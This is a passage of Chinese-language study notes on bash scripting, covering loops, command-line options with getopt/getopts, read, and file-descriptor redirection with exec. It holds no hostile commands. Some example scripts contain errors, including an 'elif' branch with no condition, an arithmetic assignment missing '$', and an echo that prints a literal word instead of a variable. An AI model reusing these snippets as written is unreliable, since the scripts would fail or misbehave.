class="hljs ini"><span class="hljs-attr">IFS</span>=$<span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p>在改变IFS之前保存原来的IFS值:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">IFS.<span class="hljs-attribute">OLD</span>=<span class="hljs-variable">$IFS</span><br><span class="hljs-attribute">IFS</span>=$&#x27;\n&#x27;<br><span class="hljs-built_in">..</span>.<br><span class="hljs-attribute">IFS</span>=IFS.OLD<br></code></pre></td></tr></table></figure><p>指定多个字符:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">IFS</span>=$<span class="hljs-string">&#x27;\n&#x27;</span>:<span class="hljs-comment">;&quot;</span><br></code></pre></td></tr></table></figure><p>直接串起来.</p><h2 id="13-2-C语言风格的for命令"><a href="#13-2-C语言风格的for命令" class="headerlink" title="13.2 C语言风格的for命令"></a>13.2 C语言风格的for命令</h2><p>和C语言风格的类似，但有一些细微的不同, 基本格式:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">for <span class="hljs-comment">(( variable assignment ; condition ; iteration process )</span>)<br><span class="hljs-keyword">do</span><br>... <br><span class="hljs-keyword">do</span><span class="hljs-symbol">ne</span><br></code></pre></td></tr></table></figure><p>没有遵循bash shell标准的for命令:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 变量赋值可以有空格<br><span class="hljs-bullet">2.</span> 条件中变量不以美元符开头<br><span class="hljs-bullet">3.</span> 迭代过程的算式未用expr命令格式<br></code></pre></td></tr></table></figure><h2 id="13-3-while-命令"><a href="#13-3-while-命令" class="headerlink" title="13.3 while 命令"></a>13.3 while 命令</h2><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">test</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">do</span><br>  other commmand<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="13-3-2-定义多个测试命令"><a href="#13-3-2-定义多个测试命令" class="headerlink" title="13.3.2 定义多个测试命令"></a>13.3.2 定义多个测试命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$var1</span><br>       [ <span class="hljs-variable">$var1</span> -ge 0 ]<br></code></pre></td></tr></table></figure><p>只有最后一个测试命令的exit status用来决定退出.</p><p>每个测试命令都出现在单独的一行。</p><p>在每次迭代中所有的测试命令都会被执行, 包括测试命令失败的那一次迭代，其测试条件依然会全部执行.</p><h2 id="13-4-until-命令"><a href="#13-4-until-命令" class="headerlink" title="13.4 until 命令"></a>13.4 until 命令</h2><p>只有测试命令的exit status不为0, bash shell才会执行循环内的命令，其工作模式和while相反, 即测试条件成功时退出.</p><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">until <span class="hljs-built_in">test</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">do</span><br>  other commands<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="13-7-控制循环"><a href="#13-7-控制循环" class="headerlink" title="13.7 控制循环"></a>13.7 控制循环</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">break</span>, 终止某层循环<br><span class="hljs-keyword">continue</span>, 终止某次循环<br></code></pre></td></tr></table></figure><p>特殊用法:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">break</span> n<br></code></pre></td></tr></table></figure><p>n指定了要跳出的循环层级, 默认情况下n为1.</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">continue</span> n<br></code></pre></td></tr></table></figure><h2 id="13-8-处理循环的输出"><a href="#13-8-处理循环的输出" class="headerlink" title="13.8 处理循环的输出"></a>13.8 处理循环的输出</h2><p>通过在done命令之后添加一个处理命令实现:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> /home/rich/*<br><span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> ]<br>  <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span> is a directory&quot;</span><br>  <span class="hljs-keyword">elif</span><br>      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span> is a file&quot;</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &gt; output.txt<br></code></pre></td></tr></table></figure><h2 id="13-9-实例"><a href="#13-9-实例" class="headerlink" title="13.9 实例"></a>13.9 实例</h2><h3 id="13-9-1-查找可执行文件"><a href="#13-9-1-查找可执行文件" class="headerlink" title="13.9.1 查找可执行文件"></a>13.9.1 查找可执行文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># finding files in the PATH</span><br><br>IFS=:<br><span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$folder</span>:&quot;</span><br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-variable">$folder</span>/*<br>    <span class="hljs-keyword">do</span> <br>        <span class="hljs-keyword">if</span> [ -x <span class="hljs-variable">$file</span> ]<br>        <span class="hljs-keyword">then</span> <br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;   <span class="hljs-variable">$file</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="13-9-2-创建多个用户账户"><a href="#13-9-2-创建多个用户账户" class="headerlink" title="13.9.2 创建多个用户账户"></a>13.9.2 创建多个用户账户</h3><p>把数据从文件中送入while命令, 在while命令尾部使用一个重定向符就可以了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># process new user accounts</span><br><br>input=<span class="hljs-string">&quot;users.csv&quot;</span><br><span class="hljs-keyword">while</span> IFS=<span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-built_in">read</span> -r userid name<br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;adding <span class="hljs-variable">$userid</span>&quot;</span><br>  useradd -c <span class="hljs-string">&quot;<span class="hljs-variable">$name</span>&quot;</span> -m <span class="hljs-variable">$userid</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$input</span>&quot;</span><br></code></pre></td></tr></table></figure><h1 id="第十四章-处理用户输入"><a href="#第十四章-处理用户输入" class="headerlink" title="第十四章 处理用户输入"></a>第十四章 处理用户输入</h1><h2 id="14-1-命令行参数"><a href="#14-1-命令行参数" class="headerlink" title="14.1 命令行参数"></a>14.1 命令行参数</h2><h3 id="14-1-1-读取参数"><a href="#14-1-1-读取参数" class="headerlink" title="14.1.1 读取参数"></a>14.1.1 读取参数</h3><p>positional parameter, 位置参数，一个特殊变量，由bash shell分配给输入到命令行的所有参数. 也就是 $0, $1 这些.</p><p>$0是程序名，$1是第一个参数，直到$9.</p><p>将文本字符串作为参数传递时，引号并非数据得一部分, 它们只是表明数据的起始位置.</p><p>在第九个变量之后，必须在变量数字周围加上花括号, 如${10}.</p><h3 id="14-1-2-读取脚本名"><a href="#14-1-2-读取脚本名" class="headerlink" title="14.1.2 读取脚本名"></a>14.1.2 读取脚本名</h3><p>当传给$0变量的实际字符串不仅仅是脚本名，而是完整的脚本路径时，变量$0就会使用整个路径.</p><p><code>basename</code>命令会返回不包含路径的脚本名.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">name</span>=$(basename <span class="hljs-variable">$0</span>)<br></code></pre></td></tr></table></figure><h3 id="14-1-3-测试参数"><a href="#14-1-3-测试参数" class="headerlink" title="14.1.3 测试参数"></a>14.1.3 测试参数</h3><p>在使用参数前一定要检查其中是否存在数据。</p><h2 id="14-2-特殊参数变量"><a href="#14-2-特殊参数变量" class="headerlink" title="14.2 特殊参数变量"></a>14.2 特殊参数变量</h2><h3 id="14-2-1-参数统计"><a href="#14-2-1-参数统计" class="headerlink" title="14.2.1 参数统计"></a>14.2.1 参数统计</h3><p>特殊变量<code>$#</code>记录命令行参数的个数.</p><p>通过使用前测试参数的总数:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span> [ <span class="hljs-symbol">$</span># -<span class="hljs-keyword">ne</span> <span class="hljs-number">2</span> ]<br></code></pre></td></tr></table></figure><p>同时，<code>$&#123;!#&#125;</code>表示最后一个命令行参数. 在花括号内不能使用美元符号，需将其替换为<code>!</code>.</p><h3 id="14-2-2-抓取所有的数据"><a href="#14-2-2-抓取所有的数据" class="headerlink" title="14.2.2 抓取所有的数据"></a>14.2.2 抓取所有的数据</h3><p><code>$*</code>变量会将命令行上提供的所有参数当作一个单词保存.</p><p><code>$@</code>变量会将命令行上提供的所有参数当作统一字符串中的多个独立的单词.</p><p>注意使用时添加双引号.</p><h2 id="14-3-移动变量"><a href="#14-3-移动变量" class="headerlink" title="14.3 移动变量"></a>14.3 移动变量</h2><p><code>shift</code>命令，将每个参数变量向左移动一个位置，$0不会改变.</p><p>给<code>shift</code>命令提供参数，可以一次移动多个位置.</p><h2 id="14-4-处理选项"><a href="#14-4-处理选项" class="headerlink" title="14.4 处理选项"></a>14.4 处理选项</h2><p>选项是跟在单破折号后面的单个字母，他能改变命令的行为。</p><h3 id="14-4-1-查找选项"><a href="#14-4-1-查找选项" class="headerlink" title="14.4.1 查找选项"></a>14.4.1 查找选项</h3><p>用<code>case</code>语句来判断某个参数是否为选项.</p><h4 id="分离选项和参数"><a href="#分离选项和参数" class="headerlink" title="分离选项和参数"></a>分离选项和参数</h4><p>shell会用双破折号(–)来表明选项列表结束，其后的参数会被当作参数处理而不是选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">  <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># extracting command line options as parameters</span><br><span class="hljs-comment">#</span><br><span class="hljs-built_in">echo</span> <br><span class="hljs-keyword">while</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ]<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span> <br>        -a) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found the -a option&quot;</span> ;; <br>        -b) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found the -b option&quot;</span> ;;<br>        -c) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found the -c option&quot;</span> ;;<br>        --) <span class="hljs-built_in">shift</span><br>            <span class="hljs-built_in">break</span> ;;<br>         *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span> is not an option&quot;</span> ;;<br>     <span class="hljs-keyword">esac</span><br>     <span class="hljs-built_in">shift</span><br> <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>利用<code>shift</code>每调用一个选项就移除一个。</p><p>在Linux中，合并选项是一个很常见的做法。</p><h3 id="14-4-2-使用getopt命令"><a href="#14-4-2-使用getopt命令" class="headerlink" title="14.4.2 使用getopt命令"></a>14.4.2 使用getopt命令</h3><p>这个命令的作用在于 <mark>格式化命令行参数</mark>.<br>getopt命令可以识别命令行参数.</p><p>getopt命令可以接受一系列任意形式的命令行选项和参数，并自动将它们转换成适当的格式:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getopt optstring parameters</span><br></code></pre></td></tr></table></figure><p>在每个需要参数值的选项字母后面加一个冒号:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">getopt ab:<span class="hljs-built_in">cd</span> -a -b test1 -<span class="hljs-built_in">cd</span> test2 testt3</span><br></code></pre></td></tr></table></figure><p>这时, 命令行参数就被格式化为:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">-<span class="hljs-selector-tag">a</span> -<span class="hljs-selector-tag">b</span> test1 -c -d -- test2 test3<br></code></pre></td></tr></table></figure><p><code>c</code> 和 <code>d</code> 是两个命令行选项, 所以把 <code>-cd</code> 变成了 <code>-c -d</code>.</p><p>因为 <code>-d</code> 没有参数, 所以后面会有 <code>--</code> 来分隔.</p><p>在这里的意思就是, <code>b</code> 这个选项需要参数.</p><h4 id="2-在脚本中使用-getopt"><a href="#2-在脚本中使用-getopt" class="headerlink" title="2. 在脚本中使用 getopt"></a>2. 在脚本中使用 getopt</h4><p><code>set</code> 命令能够处理 shell 中的各种变量</p><h3 id="14-4-3-使用更高级的-getopts"><a href="#14-4-3-使用更高级的-getopts" class="headerlink" title="14.4.3 使用更高级的 getopts"></a>14.4.3 使用更高级的 getopts</h3><p>getopts 内建于 bash shell, 比 getopt 多了一些扩展功能.</p><p>每次调用 getopts, 它一次只处理命令行上检测到的一个参数. 处理完所有参数后, 它会退出并返回一个大于 0 的推出状态码.</p><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">getopts</span> optstring variabel<br></code></pre></td></tr></table></figure><p>要去掉错误信息的话, 可以在 optstring 之前加一个冒号. </p><p>getopts 命令会将当前参数保存在命令行中定义的 variable 中.</p><p>getopts 命令会用到两个环境变量:</p><ul><li>OPTARG : 会保存选项后跟的参数值</li><li>OPTIND : 保存参数列表中 getopts 正在处理的参数的位置, 毕竟这个函数一次只处理一个选项. 第一个选项的位置为 1</li></ul><p>getopts 命令解析命令行选项时会移除开头的单破折号, 因此在 case 中定义时不用单破折号.</p><p>getopts 命令可以在参数值之间加空格, 如 <code>&quot;test1 test2&quot;</code>, 也可以把选项字母和参数值放在一起使用, 而不加空格 <code>./test.sh -abtest1</code>.</p><p>getopts 还能将命令行上找到的所有未定义的选项统一输出成问号.</p><p>在 getopts 每处理一个选项, 其会把 OPTIND 环境变量值加一.</p><h2 id="14-5-将选项标准化"><a href="#14-5-将选项标准化" class="headerlink" title="14.5 将选项标准化"></a>14.5 将选项标准化</h2><p>Linux 命令行中的选项好多已经有了不成文的含义.</p><h2 id="14-6-获取用户输入"><a href="#14-6-获取用户输入" class="headerlink" title="14.6 获取用户输入"></a>14.6 获取用户输入</h2><h3 id="14-6-1-基本的读取"><a href="#14-6-1-基本的读取" class="headerlink" title="14.6.1 基本的读取"></a>14.6.1 基本的读取</h3><p>read 命令从标准输入或另一个文件描述符号中接受输入, 在收到输入后, read 命令会将数据放进一个变量.</p><p>例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Enter your name:&quot;</span><br><span class="hljs-built_in">read</span> name<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello <span class="hljs-variable">$name</span>, welcome to my program&quot;</span><br></code></pre></td></tr></table></figure><p>这里 <code>echo</code> 的 <code>-n</code> 选项表示不会在字符串末尾输出换行符.</p><p>这里, read 把读取的值存入 <code>name</code> 这个变量.</p><p>read 的 <code>-p</code> 选项, 允许在命令行直接指定提示符:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Please enter your age: &quot;</span> age<br></code></pre></td></tr></table></figure><p>这里 <code>Please enter your age: </code> 就和之前使用 <code>echo</code> 是一样的.</p><p>可以指定多个变量.</p><p>如果不指定变量, 值会被存在 <code>REPLY</code> 这个环境变量中.</p><h3 id="14-6-2-超时"><a href="#14-6-2-超时" class="headerlink" title="14.6.2 超时"></a>14.6.2 超时</h3><p>使用 <code>-t</code> 选项, 指定 read 命令等待输入的秒数, 当计时器过期后, read 命令会返回一个非零退出状态码.</p><p>使用 <code>-n</code> 选项, 可以让 read 命令在读取指定字符数后退出. 如 <code>read -n1</code> 表示接受单个字符</p><h3 id="14-6-3-隐藏方式读取"><a href="#14-6-3-隐藏方式读取" class="headerlink" title="14.6.3 隐藏方式读取"></a>14.6.3 隐藏方式读取</h3><p><code>-s</code> 选项, 避免在 read 命令中输入的数据出现在显示器上, 实际上, 数据会被显示, 只是 read 命令会将文本颜色设成跟背景色一样.</p><h3 id="14-6-4-从文件中读取"><a href="#14-6-4-从文件中读取" class="headerlink" title="14.6.4 从文件中读取"></a>14.6.4 从文件中读取</h3><p>每次调用 read 命令, 他都会从文件中读取一行文本, 当文件中再没有内容时, read 命令退出并返回非零状态码.</p><p>最常见的方法是对文件使用 cat 命令, 将结果通过管道直接传给含有 read 命令的 while 命令.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash    </span><br>count=1<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line <br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Line <span class="hljs-variable">$count</span>: <span class="hljs-variable">$line</span>&quot;</span><br>    count=$[ <span class="hljs-variable">$count</span> + 1 ]<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Finished processing the file&quot;</span><br></code></pre></td></tr></table></figure><h1 id="第15章-呈现数据"><a href="#第15章-呈现数据" class="headerlink" title="第15章 呈现数据"></a>第15章 呈现数据</h1><h2 id="15-1-理解输入和输出"><a href="#15-1-理解输入和输出" class="headerlink" title="15.1 理解输入和输出"></a>15.1 理解输入和输出</h2><h3 id="15-1-1-标准文件描述符"><a href="#15-1-1-标准文件描述符" class="headerlink" title="15.1.1 标准文件描述符"></a>15.1.1 标准文件描述符</h3><p>Linux 系统将每个对象当作文件处理.</p><p>Linux 用文件描述符 (file descriptor) 来标识每个文件对象.</p><p>每个进程一次最多可以有九个文件描述符, bash shell 保留了前三个文件描述符.</p><ul><li>0 SIDIN  标准输入</li><li>1 STDOUT 标准输出</li><li>2 STDERR 标准错误</li></ul><p>当命令生成错误消息时, shell 并未将错误消息重定向到输出重定向文件.</p><p>默认情况下, STDERR 文件描述符和 STDOUT 文件描述符指向同样的地方.</p><h3 id="15-1-2-重定向错误"><a href="#15-1-2-重定向错误" class="headerlink" title="15.1.2 重定向错误"></a>15.1.2 重定向错误</h3><h4 id="1-只重定向错误"><a href="#1-只重定向错误" class="headerlink" title="1. 只重定向错误"></a>1. 只重定向错误</h4><p>可以选择只重定向错误消息, 将该文件描述符放在重定向符号前, 该值必须紧紧地放在重定向符号前.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -al badfile 2&gt; <span class="hljs-built_in">test</span></span><br></code></pre></td></tr></table></figure><h4 id="2-重定向错误和数据"><a href="#2-重定向错误和数据" class="headerlink" title="2. 重定向错误和数据"></a>2. 重定向错误和数据</h4><p>需要用两个重定向符号, 且在符号前面放上待重定向数据对应的文件描述符:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -al <span class="hljs-built_in">test</span> test2 test3 badfile 2&gt; test6 1&gt; test7</span><br></code></pre></td></tr></table></figure><p>可以利用 <code>&amp;&gt;</code> 这个特殊的重定向符号, 把 STDOUT 和 STDERR 重定向到同一个文件.</p><p>为了避免错误信息散落在输出文件中, 相较于标准输出, bash shell 自动赋予了错误消息更高的优先级.</p><h2 id="15-2-在脚本中重定向输出"><a href="#15-2-在脚本中重定向输出" class="headerlink" title="15.2 在脚本中重定向输出"></a>15.2 在脚本中重定向输出</h2><p>有两种方法在脚本中重定向输出:</p><ul><li>临时重定向行输出</li><li>永久重定向脚本中的所有输出</li></ul><h3 id="15-2-1-临时重定向"><a href="#15-2-1-临时重定向" class="headerlink" title="15.2.1 临时重定向"></a>15.2.1 临时重定向</h3><p>在重定向到文件描述符时, 必须在文件描述符数字之前加一个 <code>&amp;</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is an error&quot;</span> &gt;&amp;2<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is an normal output&quot;</span><br></code></pre></td></tr></table></figure><p>默认情况下, Linxu 会将 STDERR 导向 STDOUT, 如果在运行脚本时重定向了 STDERR, 脚本中所有导向 STDERR 的文本都会被重定向.</p><h3 id="15-2-2-永久重定向"><a href="#15-2-2-永久重定向" class="headerlink" title="15.2.2 永久重定向"></a>15.2.2 永久重定向</h3><p>可以用 exec 命令告诉 shell 在执行脚本期间重定向某个特定的文件描述符:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">1</span>&gt;testout<br></code></pre></td></tr></table></figure><p>exec 命令会启动一个新 shell 并将 STDOUT 文件描述符重定向到文件. 这里实际上把 1 这个文件描述重新分配给了 testout 这个文件.</p><p>exec 在 man page 中的描述为: execute commands and open, close, or copy file descriptors.</p><h2 id="15-3-在脚本中重定向输入"><a href="#15-3-在脚本中重定向输入" class="headerlink" title="15.3 在脚本中重定向输入"></a>15.3 在脚本中重定向输入</h2><p>exec 命令允许你将 STDIN 重定向到 Linux 系统上的文件中:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">0</span>&lt; testfile<br></code></pre></td></tr></table></figure><p>如 :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">exec</span> 0&lt; testfile<br>count=0<br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line<br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Line #<span class="hljs-variable">$count</span>: line&quot;</span><br>    count=$[ <span class="hljs-variable">$count</span> + 1 ]<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="15-4-创建自己的重定向"><a href="#15-4-创建自己的重定向" class="headerlink" title="15.4 创建自己的重定向"></a>15.4 创建自己的重定向</h2><h3 id="15-4-1-创建输出文件描述符"><a href="#15-4-1-创建输出文件描述符" class="headerlink" title="15.4.1 创建输出文件描述符"></a>15.4.1 创建输出文件描述符</h3><p>可以用 exec 命令来给输出分配文件描述符.</p><p>一旦将另一个文件描述符分配给一个文件, 这个重定向就会一直有效, 直到你重新分配.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">3</span>&gt;testout<br></code></pre></td></tr></table></figure><h3 id="15-4-2-重定向文件描述符"><a href="#15-4-2-重定向文件描述符" class="headerlink" title="15.4.2 重定向文件描述符"></a>15.4.2 重定向文件描述符</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">3</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>把文件描述符 3 指向文件描述符 1.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>恢复.</p><h3 id="15-4-3-创建输入文件描述符"><a href="#15-4-3-创建输入文件描述符" class="headerlink" title="15.4.3 创建输入文件描述符"></a>15.4.3 创建输入文件描述符</h3><p>在重定向到文件之前, 先将 STDIN 文件描述符保存到另外一个文件描述符, 然后在读取完文件之后再将 STDIN 恢复到它原来的位置:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-built_in">exec</span> 6&lt;&amp;0<br><br><span class="hljs-built_in">exec</span> 0&lt; testfile<br><br>count=1<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line <br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Line #<span class="hljs-variable">$count</span>: <span class="hljs-variable">$line</span>&quot;</span><br>    count=[ <span class="hljs-variable">$count</span> + 1 ]<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">exec</span> 0&lt;&amp;6<br></code></pre></td></tr></table></figure><h3 id="15-4-4-创建读写文件描述符"><a href="#15-4-4-创建读写文件描述符" class="headerlink" title="15.4.4 创建读写文件描述符"></a>15.4.4 创建读写文件描述符</h3><p>可以打开单个文件描述符来作为输入和输出.</p><p>任何读或写都会从文件指针上次的位置开始, 比如你先用这个文件描述符输出了一行, 这时这个指针就指向这一行的末尾了, 如果你这个时候输入一段文本, 这个文本就会插入到这个指针所指的位置, 而不是文件的末尾.</p><h3 id="15-4-5-关闭文件描述符"><a href="#15-4-5-关闭文件描述符" class="headerlink" title="15.4.5 关闭文件描述符"></a>15.4.5 关闭文件描述符</h3><p>如果你创建了新的输入或输出文件描述符, shell 